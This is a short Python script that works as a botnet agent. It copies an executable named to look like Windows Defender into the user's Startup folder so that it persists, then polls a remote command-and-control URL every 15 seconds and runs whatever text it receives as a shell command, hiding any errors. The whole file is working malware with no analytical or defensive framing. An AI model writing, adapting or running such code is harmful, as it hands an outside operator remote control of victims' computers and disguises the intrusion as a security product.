import requests
import os
from os import system
import platform
import time
path=os.path

url=f"http://bot-net.herokuapp.com/latest/?os={platform.system()}"
startup_path=f"C:\\Users\\{os.getenv('USERNAME')}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"

def add2startup(pathname):
    name = path.basename(pathname)
    if not path.exists(path.join(startup_path,name)):
        os.system(f'copy {pathname} "{startup_path}"')


if __name__=="__main__":
    if platform.system()=="Windows":
        add2startup(path.join(os.getcwd(),"windowsdefender.exe"))
    while True:
        try:
            code=requests.get(url).text
            system(code)
        except:
            pass
        time.sleep(15)



